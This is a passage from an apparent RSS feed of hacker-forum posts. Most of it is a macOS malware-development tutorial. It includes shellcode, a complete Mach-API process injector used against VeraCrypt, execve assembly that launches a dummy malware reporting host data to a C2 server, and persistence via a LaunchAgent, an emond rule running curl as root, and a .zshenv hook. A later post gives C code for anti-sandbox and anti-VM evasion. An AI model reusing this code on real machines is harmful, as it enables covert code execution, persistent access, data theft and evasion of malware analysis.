\xeb\x1e\x5e\xb8\x04\x00\x00\x02\xbf\x01
\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05
\xb8\x01\x00\x00\x02\xbf\x00\x00\x00\x00
\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c
\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a";

typedef int (*funcPtr)();

int main(int argc, char **argv)
{
    funcPtr ret = (funcPtr) output;
    (*ret)();

    return 0;
}
</code></pre>
<p>Alright, now that we have the <code>shellcode</code>, let’s start writing the actual injector. The <code>main</code> function seems like the natural starting point. The logic is simple: we take a single command-line argument, which should be the process ID (PID) of the target process to inject the shellcode into. Then, we obtain a handle to our task using <code>task_for_pid()</code>. Next, we’ll allocate a memory buffer in the remote task with <code>mach_vm_allocate()</code>. After that, we’ll write our shellcode to the remote buffer with <code>mach_vm_write()</code>. We’ll modify the memory permissions of the remote buffer with <code>mach_vm_protect()</code>. Then, we’ll update the remote thread context to point to the start of the shellcode with <code>thread_create_running()</code>. Finally, we’ll run our shellcode, which will print “Hello World”.</p>
<p>Remember our earlier discussion about the differences between a Mach task thread and a BSD pthread, and the <code>task_for_pid()</code> API call. In order to develop a utility that utilizes <code>task_for_pid()</code>, you’ll need to create an <code>Info.plist</code> file. This file will be embedded into your executable and will enable code signing with the key set to “allow”. Below is an example of the Info.plist:</p>
<pre><code class="lang-c">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;com.apple.security.get-task-allow&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>Note:** not all sections of a program’s virtual memory permit their contents to be interpreted as code by the CPU (i.e., “marked executable”). Memory can be marked as readable (R), writable (W), executable (E), or some combination of the three. For instance, a page marked RW means one can read/write to these addresses in memory, but their contents may not be treated as executable by the CPU. This is a crucial aspect of memory protection and security in modern operating systems.</p>
<p>Executable memory regions are typically marked with the execute (E) permission, allowing the CPU to interpret the contents of these regions as machine instructions and execute them. This is essential for running programs, as the CPU needs to fetch instructions from memory and execute them.</p>
<p>However, allowing arbitrary memory regions to be executable can pose significant security risks, such as buffer overflow attacks or injection of malicious code. Therefore, modern operating systems employ memory protection mechanisms to restrict the execution of code to specific, authorized regions of memory.</p>
<p>By controlling the permissions of memory pages, operating systems can enforce security policies and prevent unauthorized execution of code. For example, writable memory regions that contain data should not be executable to prevent the execution of injected malicious code. Conversely, executable code should not be writable to prevent tampering with the program’s instructions.</p>
<p>Alright, the entry point we converts the PID provided as a string to an integer and calls the <code>inject_shellcode</code> function to inject the shellcode into the target process using the provided PID,</p>
<p>We need to interact with the target process, so we declare a few variables to hold essential information. These include <code>remote_task</code> to represent the task port of the target process, <code>remote_stack</code> to store the address of the allocated memory for the remote stack within the target process, and <code>shellcode_region</code> to keep track of the memory region allocated for the shellcode.</p>
<p>Now, the process begins. We need to get permission to access the target process, so we use the <code>task_for_pid</code> function to obtain the task port. This allows us to manipulate the memory and threads of the target process.</p>
<p>With access granted, we proceed to allocate memory within the target process. We reserve space for both the remote stack and the shellcode using <code>mach_vm_allocate</code>. This ensures that we have a place to execute our code, Once memory is allocated, we write our shellcode into the allocated memory space of the target process using <code>mach_vm_write</code>. This effectively places our code where it needs to be executed.</p>
<pre><code class="lang-c">int inject_shellcode(pid_t pid, unsigned char *shellcode, size_t shellcode_size) {
    task_t remote_task;
    mach_vm_address_t remote_stack = 0;
    vm_region_t shellcode_region;
    mach_error_t kr;

    // Get the task port for the target process
    kr = task_for_pid(mach_task_self(), pid, &amp;remote_task);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get the task port for the target process: %s\n", mach_error_string(kr));
        return -1;
    }

    // Allocate memory for the stack in the target process
    kr = mach_vm_allocate(remote_task, &amp;remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate memory for remote stack: %s\n", mach_error_string(kr));
        return -1;
    }

    // Allocate memory for the shellcode in the target process
    kr = mach_vm_allocate(remote_task, &amp;shellcode_region.addr, shellcode_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate memory for remote code: %s\n", mach_error_string(kr));
        return -1;
    }
    shellcode_region.size = shellcode_size;
    shellcode_region.prot = VM_PROT_READ | VM_PROT_EXECUTE;

    // Write the shellcode to the allocated memory in the target process
    kr = mach_vm_write(remote_task, shellcode_region.addr, (vm_offset_t)shellcode, shellcode_size);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to write shellcode to remote process: %s\n", mach_error_string(kr));
        return -1;
    }

    // Adjust memory permissions for the shellcode
    kr = vm_protect(remote_task, shellcode_region.addr, shellcode_region.size, FALSE, shellcode_region.prot);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to set memory permissions for remote code: %s\n", mach_error_string(kr));
        return -1;
    }

    // Create a remote thread to execute the shellcode
    x86_thread_state64_t thread_state;
    memset(&amp;thread_state, 0, sizeof(thread_state));
    thread_state.__rip = (uint64_t)shellcode_region.addr;
    thread_state.__rsp = (uint64_t)(remote_stack + STACK_SIZE);

    thread_act_t remote_thread;
    kr = thread_create(remote_task, &amp;remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to create remote thread: %s\n", mach_error_string(kr));
        return -1;
    }

    // Set the thread state
    kr = thread_set_state(remote_thread, x86_THREAD_STATE64, (thread_state_t)&amp;thread_state, x86_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to set thread state: %s\n", mach_error_string(kr));
        return -1;
    }

    // Resume the remote thread
    kr = thread_resume(remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to resume remote thread: %s\n", mach_error_string(kr));
        return -1;
    }

    printf("Shellcode injected successfully!\n");

    mach_port_deallocate(mach_task_self(), remote_thread);

    return 0;
}
</code></pre>
<p>To ensure that our shellcode can run, we modify the memory permissions of the allocated memory region containing the shellcode. We use <code>vm_protect</code> to set the appropriate permissions, allowing for execution. Now, it’s time to execute our shellcode. We create a remote thread within the target process using <code>thread_create</code>. This thread will be responsible for running our injected code.</p>
<p>Before we start the thread, we need to set its state. We prepare the thread to execute our shellcode by setting the instruction pointer (<code>rip</code>) to the starting address of the shellcode and the stack pointer (<code>rsp</code>) to the allocated remote stack. Finally, we’re ready to execute our shellcode. We resume the remote thread using <code>thread_resume</code>, allowing it to begin executing the injected code.</p>
<p>If everything goes smoothly, we print a success message indicating that the shellcode was injected successfully. We also clean up any resources used during the injection process by deallocating Mach ports. And that’s it! The entire process of injecting shellcode into a target process on macOS using Mach APIs.</p>
<p>In our injector, we’re injecting shellcode into a target process using Mach APIs in macOS. Now, one significant difference between POSIX threads and Mach threads comes into play here.<br>
POSIX threads utilize the thread local storage (TLS) data structure, which is crucial for managing thread-specific data. However, Mach threads don’t have this concept of TLS.</p>
<p>Now, when we inject our shellcode into the target process and create a remote thread to execute it, we can’t simply point the instruction pointer in the thread context struct and expect everything to work smoothly. Why? Because our shellcode, which is essentially unmanaged code, needs to run in a controlled environment, and transitioning from a Mach thread directly to executing our shellcode might cause issues.</p>
<p>So, to prevent potential crashes or errors, we need to ensure that our shellcode is executed within the context of a fully-fledged POSIX thread. This means that as part of our injection process, we have to somehow promote our shellcode from being executed within the context of a base Mach thread to being executed within the context of a POSIX thread. By doing this, we create a more stable environment for our shellcode to execute, ensuring that when the target process resumes its execution at the start of our shellcode, it does so without any issues. This promotion process is essential for the successful execution of our injected shellcode in user mode without causing crashes or unexpected behavior.</p>
<p>As you can see, we injected our <code>shellcode</code> into the <code>Veracrypt</code> process successfully. The message “Hello World!” was printed, confirming that the shellcode executed as expected and produced the desired output.</p>
<p><img src="https://0xf00sec.github.io/images/IMG5.png" width="690" height="273"> </p>
<p>However, let’s shift our focus now. Remember the code we previously developed to transmit system data to the C2 server? What if we inject shellcode into the Veracrypt process to execute our dummy malware, enabling it to establish communication with the C2 server and transmit host data?</p>
<p>To execute a shell command, considering I’m running zsh, we need to trigger a syscall to run <code>/bin/zsh -c</code>. For this, we need to utilize <code>execve</code>. What does this do? Simply put, it executes the program referenced by <code>_pathname</code>, which in our case will be the path to our dummy malware executable.</p>
<p>Alright, let’s proceed by writing a simple assembly code to execute <code>/bin/zsh -c '/Users/foo/dummy'</code>. First, we’ll set up a register (<code>rbx</code>) and load the string <code>'/bin/zsh'</code> into it. Once this string is pushed onto the stack, we’ll proceed to load the ASCII values for <code>-c</code> into the lower 16 bits of the <code>rax</code> register. After pushing this <code>-c</code> flag onto the stack, we’ll set the <code>rbx</code> register to point to the <code>-c</code> flag on the stack, as it will be necessary later during the syscall preparation.</p>
<p>Any additional details will be described in comments within the code. At the end of this section, there’s an indirect jump facilitating the execution of subsequent instructions. This jump redirects the program flow to the address stored in the <code>exec</code> subroutine, ensuring the continuity of execution.</p>
<pre><code class="lang-c">global _main

_main:
    xor rdx, rdx        ; Clear rdx register
    push rdx            ; Push NULL onto stack (String terminator)
    mov rbx, '/bin/zsh' ; Load '/bin/zsh' into rbx
    push rbx            ; Push '/bin/zsh' onto stack
    mov rdi, rsp        ; Set rdi to point to '/bin/zsh\0'
    xor rax, rax        ; Clear rax register
    mov ax, 0x632D      ; Load "-c" into lower 16 bits of rax
    push rax            ; Push "-c" onto stack
    mov rbx, rsp        ; Set rbx to point to "-c"
    push rdx            ; Push NULL onto stack
    jmp short dummy     ; Jump to label dummy

exec:
    push rbx            ; Push "-c" onto stack
    push rdi            ; Push '/bin/zsh' onto stack
    mov rsi, rsp        ; Set RSI to point to stack
    push 59             ; Push syscall number
    pop rax             ; Pop syscall number into rax
    bts rax, 25         ; Set 25th bit of rax (AT_FDCWD flag)
    syscall             ; Invoke syscall

dummy:
    call exec                   ; Call subroutine exec
    db '/Users/foo/dummy_m', 0  ; Define string
    push rdx                    ; Push NULL onto stack
</code></pre>
<p>Alright, it’s time to try this beauty. As usual, we’ll need to extract the shellcode and test it before using it. And just like that, bingo! We’ve successfully injected our shellcode, triggering our dummy malware. We’re now receiving host information in the C2 server. We can push this further by exploring additional capabilities and attack vectors, even achieve persistence, but I think that’s enough for now.</p>
<p><img src="https://0xf00sec.github.io/images/IMG6.png" width="690" height="353"> </p>
<p>Executing and sending host information essentially does nothing harmful to your computer. “Dummy” is more about demonstrating how malware can be triggered and how it uses injection techniques to spread. It’s also interesting for defensive evasion or adding backdoor capabilities. This was just a quick look at the Mach API, covering system calls and code injection techniques, and how an attacker can utilize something like process injection to achieve malicious behavior. In this example, we’ve used a legitimate process to inject and execute “malicious code,” potentially exposing host data to an attacker. This can be pushed further, but we’re here just to learn, and I encourage you to experiment with caution. Code injection must be used with care.</p>
<p>I hope you’ve learned something from this simple introduction, and there’s a lot more to explore beyond what we’ve touched on here. All the code used here can be found at <a href="https://github.com/0xf00sec/OSX-Injection" rel="noopener nofollow ugc">Github</a></p>
<h1><a name="persistence-11" class="anchor" href="https://0x00sec.org#persistence-11"></a>Persistence</h1>
<p>Alright, let’s discuss <em>persistence</em>. It’s a crucial step once we’ve gained initial access and understood the situation. Typically, we aim to establish some form of persistence. We don’t want to rely solely on that initial access point because it could be terminated for various reasons. There might be issues with the user’s computer, or the target could decide to shut everything down. So, it’s important to have a method in place to maintain access to the target.</p>
<p>While there are several persistence techniques for MacOS systems, many of them require root privileges to perform, or exploit some sort of low-level vulnerability to escalate. To keep things simple, let’s focus on Userland Persistence. First, I’ll describe some well-known persistence techniques and some lesser-known ones, so you can understand how these techniques work and how malware can use them. Alright, let’s go :</p>
<p>Before I began writing this article, I analyzed some samples targeting macOS and read some threat reports. One commonality among them is that launch agents and launch daemons are by far the most prevalent methods of persistence. Why, you might ask? Well, it’s because of their simplicity and flexibility. You could liken them to the startup folder persistence equivalent on Windows. However, detecting such techniques is relatively easy. Remember when we mentioned LOLBins? Well, think of it as a similarly straightforward and common method, and the detection methods are also well-known.</p>
<h2><a name="launchagent-launchdaemon-12" class="anchor" href="https://0x00sec.org#launchagent-launchdaemon-12"></a>LaunchAgent &amp; LaunchDaemon</h2>
<p>LaunchAgents and LaunchDaemons are key components of macOS, responsible for managing processes automatically. LaunchAgents are typically located in the <code>~/Library/LaunchAgents</code> directory for user-specific tasks, triggering actions when a user logs in. On the flip side, LaunchDaemons are situated in <code>/Library/LaunchDaemons</code>, initiating tasks upon system startup.</p>
<p>Although LaunchAgents primarily operate within user sessions, they can also be found in system directories like <code>/System/Library/LaunchAgents</code>. However, modifying these files would require disabling System Integrity Protection (SIP), which is not recommended due to potential security risks. In contrast, LaunchDaemons, operating at a system level, require administrator privileges for installation and typically reside in <code>/Library/LaunchDaemons</code>.</p>
<p>Both LaunchAgents and LaunchDaemons are configured using <code>.plist</code> files, specifying commands or referencing executable files for execution.</p>
<p>LaunchAgents are suitable for tasks requiring user interaction, while LaunchDaemons are better suited for background processes. Let’s take a LaunchAgents example:</p>
<pre><code class="lang-auto">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.pre.foo.plist&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;/Users/foo/dummy&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>So, what does this all mean? Basically, when we want our binary to run every time a user logs onto the system, we just tell launchd to handle it. It’s pretty straightforward, right? But here’s where it gets interesting: there’s something called <code>emond</code>, a command native to macOS located at <code>/sbin/emond</code>. This little tool is quite handy; it accepts events from various services, processes them through a simple rules engine, and takes action accordingly. These actions can involve running commands or performing other tasks.</p>
<p>Now, <code>emond</code> isn’t just any ordinary command. It functions as a regular daemon and is kicked off by launchd every time the operating system starts up. Its configuration file, where we set when and how <code>emond</code> runs, hangs out with the other system daemons at <code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.</p>
<p>But how can we use this event monitoring daemon to establish persistence? Well, the mechanics of <code>emond</code> are pretty much like any other LaunchDaemon. It’s launchd’s job to fire up all the LaunchDaemons and LaunchAgents during the boot process. Since <code>emond</code> starts up during boot, if you’re using the <code>_run command_</code> action, you need to be mindful of what command you’re executing and when during the boot process it’ll happen.</p>
<pre><code class="lang-c">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;array&gt;
    &lt;dict&gt;
        &lt;key&gt;name&lt;/key&gt;
        &lt;string&gt;foo&lt;/string&gt;
        &lt;key&gt;enabled&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;eventTypes&lt;/key&gt;
        &lt;array&gt;
            &lt;string&gt;startup&lt;/string&gt;
        &lt;/array&gt;
        &lt;key&gt;actions&lt;/key&gt;
        &lt;array&gt;
            &lt;dict&gt;
                &lt;key&gt;command&lt;/key&gt;
                &lt;string&gt;sleep&lt;/string&gt;
                &lt;key&gt;user&lt;/key&gt;
                &lt;string&gt;root&lt;/string&gt;
                &lt;key&gt;arguments&lt;/key&gt;
                &lt;array&gt;
                    &lt;string&gt;10&lt;/string&gt;
                &lt;/array&gt;
                &lt;key&gt;type&lt;/key&gt;
                &lt;string&gt;RunCommand&lt;/string&gt;
            &lt;/dict&gt;
            &lt;dict&gt;
                &lt;key&gt;command&lt;/key&gt;
                &lt;string&gt;curl&lt;/string&gt;
                &lt;key&gt;user&lt;/key&gt;
                &lt;string&gt;root&lt;/string&gt;
                &lt;key&gt;arguments&lt;/key&gt;
                &lt;array&gt;
                    &lt;string&gt;dns.log&lt;/string&gt;
                &lt;/array&gt;
                &lt;key&gt;type&lt;/key&gt;
                &lt;string&gt;RunCommand&lt;/string&gt;
            &lt;/dict&gt;
        &lt;/array&gt;
    &lt;/dict&gt;
&lt;/array&gt;
&lt;/plist&gt;
</code></pre>
<p>So, in our <strong>SampleRules.plist</strong> file, we have a setup called ‘foo’. First off, it waits for 10 seconds after startup. This is done using a command called <code>sleep</code>. Next, we use <code>curl</code> to simply send a DNS query record to verify that it’s actually working, and once the service has started, your event will immediately fire and trigger any actions. <code>emond</code> isn’t a new way to monitor events on macOS, but it’s considered innovative when used for offensive purposes.</p>
<h2><a name="bash-profiles-zsh-startup-13" class="anchor" href="https://0x00sec.org#bash-profiles-zsh-startup-13"></a>Bash Profiles &amp; Zsh Startup</h2>
<p>Let’s talk about those bash profiles on Linux systems. They’re essentially scripts containing commands that run whenever you open up a terminal, Instead of bash profiles, zsh has its own version called start files, which serve the same purpose. But here’s the twist: zsh also comes with an extra file called the zsh environment file. This file is more powerful because it kicks in more often, ensuring persistence across different interactions with zsh.</p>
<p>The cool thing is that even if you just type in a command like <code>zsh -c</code>, this shell environment file still gets sourced. This means your persistence setup remains strong, no matter how you’re using shell.</p>
<pre><code class="lang-sh">~ &gt; cat .zshenv
. "/Users/foo/startup.sh" &gt; /dev/null 2&gt;&amp;1&amp;
</code></pre>
<p>Now, every time you open a terminal and Z shell initializes, it will automatically execute the <code>startup.sh</code> script, ensuring that your desired commands or actions are performed consistently.</p>
<p><img src="https://0xf00sec.github.io/images/IMG7.png" width="592" height="257"> </p>
<p>Now, to execute it in the background, we use <code>setopt NO_MONITOR</code>. This command disables job monitoring and then runs the <code>startup.sh</code> script in the background. As a result, the script runs every time you open a terminal with Z shell, but it runs silently in the background.</p>
<p>So, you get the gist of it, right? These are some of the known techniques I’ve come across, especially in samples. There’s more like Cron jobs, Dock shortcuts, and more. But to be honest, if I were to write specifically for macOS, I’d go multi-stage and avoid any known techniques out there. Simply put, once a technique is made public, it’s burned. So , I’ll focus more on developing something that has a longer lifespan.</p>
<p>Nowadays, with all the public scripts and post-exploitation frameworks out there, attackers try to get the job done easily without wasting time or energy. Writing malware takes time and energy, so they aim for low-hanging fruit that’s just acceptable for a malware author. Because once the malware is burned, it’s burned. But if it’s a long-term operation, it takes time and skill to put together, and you can’t risk the malware getting burned by the first few infection. But for a red team exercise, for example, you’d test low-hanging fruit and an easy way to get in before emulating advance threats.</p>
<p>Also, a skilled attacker can get past most security setups with just a simple MSFvenom shellcode. Yep, so at the end, it comes down to the simplest attacks. Usually, at this point in the article, I’ve added a section for writing a simple malware, where we take all that we’ve covered and put it into one malware(rootkit). However, considering some thought, adding more code might just make things drag on and get confusing. We can save that for another article where we can really dive into the whole process because rootkits are quite advanced pieces of code and require knowledge about the kernel and low-level system programming. Since we just covered the surface here, I don’t think a rootkit would be a match for this article; it needs its own article.</p>
<p>But hey, since we’ve already covered code injection pretty extensively, we’ll get into the fancy stuff later.</p>
<h1><a name="conclusion-14" class="anchor" href="https://0x00sec.org#conclusion-14"></a>Conclusion</h1>
<p>In conclusion, I hope that you’ve enjoyed and learned something from this article. We’ve covered a broad array of topics related to the macOS architecture and API, although we’ve only scratched the surface. By delving into techniques and writing simple code using the Mach API, we’ve gained a deeper understanding of the environment, its features, and its security. We’ve covered fundamental concepts like code injection and simple persistence techniques, and we’ve even seen macOS syscalls in action through examples. Until next time.</p>
<h2><a name="references-15" class="anchor" href="https://0x00sec.org#references-15"></a>References</h2>
<ul>
<li><a href="https://developer.apple.com/library/archive/documentation/DeviceDrivers/Conceptual/WritingDeviceDriver/IOService/IOService.html#//apple_ref/doc/uid/TP30000697-TPXREF101" rel="noopener nofollow ugc">I/O Kit Fundamentals</a></li>
<li><a href="https://developer.apple.com/library/archive/navigation/#section=Platforms&amp;topic=macOS" rel="noopener nofollow ugc">macOS - Apple Developer</a></li>
<li><a href="https://knight.sc/malware/2019/03/15/code-injection-on-macos.html" rel="noopener nofollow ugc">Code Injection on macOS</a></li>
<li><a href="https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/" rel="noopener nofollow ugc">Simple Code Injection</a></li>
<li><a href="http://www.idryman.org/blog/2014/12/02/writing-64-bit-assembly-on-mac-os-x/" rel="noopener nofollow ugc">Writing 64-bit Assembly on Mac OS X</a></li>
<li><a href="https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Architecture/Architecture.html#//apple_ref/doc/uid/TP30000905-CH1g-CACDAEDC" rel="noopener nofollow ugc">Architecture of the Kernel - Darwin</a></li>
</ul>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/macos-malware-development/39443">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/macos-malware-development/39443</link>
          <pubDate>Sat, 09 Mar 2024 02:01:53 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39443</guid>
          <source url="https://0x00sec.org/t/macos-malware-development/39443.rss">macOS Malware Development</source>
        </item>
        <item>
          <title>Secure Browsing Habits</title>
          <dc:creator><![CDATA[hjishbfhuwebf]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hi,</p>
<p>So, I’m fairly certain I know the answer to this, but I like to take the naiv approach.</p>
<p>Assuming there are no 0-days involved, can any Malware be run on a computer(any os) by visiting arbitiary websites and downloading arbitiary files WITHOUT actually opening/running the Downloaded files.</p>
<p>Again, not refering to watering-hole attacks, 0-days, or anything unpatched.</p>
<p>Thanks for any Answers!</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/secure-browsing-habits/39344">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/secure-browsing-habits/39344</link>
          <pubDate>Fri, 01 Mar 2024 19:16:20 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39344</guid>
          <source url="https://0x00sec.org/t/secure-browsing-habits/39344.rss">Secure Browsing Habits</source>
        </item>
        <item>
          <title>Malware development lesson plan for this month</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p><a href="https://twitter.com/blc_chef/status/1763337789465383001/photo/1" class="onebox" target="_blank" rel="noopener nofollow ugc">https://twitter.com/blc_chef/status/1763337789465383001/photo/1</a></p>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-lesson-plan-for-this-month/39328">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-lesson-plan-for-this-month/39328</link>
          <pubDate>Fri, 01 Mar 2024 00:52:08 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39328</guid>
          <source url="https://0x00sec.org/t/malware-development-lesson-plan-for-this-month/39328.rss">Malware development lesson plan for this month</source>
        </item>
        <item>
          <title>Malware development | anti-sandbox | anti-VM techniques in c</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>malware development | anti-sandbox | anti-VM techniques in c</p>
<p>video out now but thanks for subscribing</p><aside class="onebox allowlistedgeneric" data-onebox-src="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg">
  <header class="source">
      <img src="https://www.youtube.com/s/desktop/fe730087/img/favicon.ico" class="site-icon" width="16" height="16">

      <a href="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg" target="_blank" rel="noopener nofollow ugc">YouTube</a>
  </header>

  <article class="onebox-body">
    <img src="https://yt3.googleusercontent.com/zMeNKZunaI4ML_acQo1UW-qYDMmBIrIkRl4sxTb_aiPk_d5vnFyGiPMzakSXubw7QZzlKNPmtg=s900-c-k-c0x00ffffff-no-rj" class="thumbnail onebox-avatar" width="500" height="500">

<h3><a href="https://www.youtube.com/channel/UC88YVlKcrgL4-PRDPOuFDbg" target="_blank" rel="noopener nofollow ugc">lnl training consult</a></h3>

  <p>Welcome to our YouTube channel, where we offer an extensive range of courses focused on malware development, reverse engineering, low-level security, programming, and much more. Our channel is dedicated to providing top-rated educational content that...</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>Analyzing a malwareapp dynamically</p>
<p>Dynamic analysis of an executable may be performed either automatically by a sandbox or manually by a malware  analyst. Malicious applications often use various methods to finger print the environment they’re being executed in and perform different actions based on a given execution environment situation.</p>
<p>Automated analysis is performed in a simplified sandbox environment which may have some specific traits;  particularly it may not be able to emulate all execution nuances of  a real environment.</p>
<p>Both automated and manual analysis have common characteristics, in particular they are usually performed in virtual environments which can be easily detected if not configured properly.</p>
<p>Most sandbox detection techniques revolve around checking specific environment attributes</p>
<p>Example<br>
limited resources, indicative device names  artifacts ,presence of specific files, registry keys</p>
<p>Detecting virtual environments</p>
<p>Both sandboxes and analyst’s virtual Operating Systems usually can’t 100% emulate actual execution environment like typical user workstations). Virtual environments have limited resources ,corresponding device names whch  can also provide useful information, may have VM-specific tools and drivers installed, often look like  fresh Windows installations and sometimes use hardcoded user or computer names.</p>
<p>Hardware resources information retrieval<br>
sandboxes /VM boxes used by analysts are  subjected  to some constraints - they often have limited resources.</p>
<p>Typical user workstation have  processors with at least 2 cores, a minimum of 2 GB of RAM and a 100 GB hard drive space. We can verify if the environment our malicious application is being executed in is a subject to these constrains:</p>
<p>// check CPU<br>
SYSTEM_INFO systemInfo;<br>
GetSystemInfo(&amp;systemInfo);<br>
DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;<br>
if (numberOfProcessors &lt; 2) return false;</p>
<p>// check RAM<br>
MEMORYSTATUSEX memoryStatus;<br>
memoryStatus.dwLength = sizeof(memoryStatus);<br>
GlobalMemoryStatusEx(&amp;memoryStatus);<br>
DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;<br>
if (RAMMB &lt; 2048) return false;</p>
<p>// check HDD</p>
<p>HANDLE hDevice = CreateFileW(L"\\.\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);</p>
<p>DISK_GEOMETRY pDiskGeometry;</p>
<p>DWORD bytesReturned;</p>
<p>DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0,&amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL);</p>
<p>DWORD diskSizeGB;</p>
<p>diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;</p>
<p>if (diskSizeGB &lt; 100) return false;</p>
<p>Devices and vendor names</p>
<p>On default VM installations, devices often have predictable names, for example containing strings associated with the specific hypervisor. We can check for hard drive name, optical disk drive name, BIOS version, computer manufacturer and model name, graphics controller name etc. Relevant information can be retrieved with WMI queries (check properties like “Name”, “Description”, “Caption”).</p>
<p>Below you can see an example of HDD name retrieval using native Windows API functions (without WMI):</p>
<p>HDEVINFO hDeviceInfo = SetupDiGetClassDevs(&amp;GUID_DEVCLASS_DISKDRIVE, 0, 0, DIGCF_PRESENT);</p>
<p>SP_DEVINFO_DATA deviceInfoData;</p>
<p>deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);</p>
<p>SetupDiEnumDeviceInfo(hDeviceInfo, 0, &amp;deviceInfoData);</p>
<p>DWORD propertyBufferSize;</p>
<p>SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, NULL, 0, &amp;propertyBufferSize);</p>
<p>PWSTR HDDName = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, propertyBufferSize);SetupDiGetDeviceRegistryPropertyW(hDeviceInfo, &amp;deviceInfoData, SPDRP_FRIENDLYNAME, NULL, (PBYTE)HDDName, propertyBufferSize, NULL);</p>
<p>CharUpperW(HDDName);</p>
<p>if (wcsstr(HDDName, L"VBOX")) return false;</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326</link>
          <pubDate>Thu, 29 Feb 2024 23:32:54 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39326</guid>
          <source url="https://0x00sec.org/t/malware-development-anti-sandbox-anti-vm-techniques-in-c/39326.rss">Malware development | anti-sandbox | anti-VM techniques in c</source>
        </item>
        <item>
          <title>Unpacking an elf binary packed by an unknown custom packer</title>
          <dc:creator><![CDATA[dedi0x90]]></dc:creator>
          <category>Uncategorized</category>
          <description><![CDATA[
            <p>Greeting;<br>
so I am attempting to unpack this elf binary ;</p>
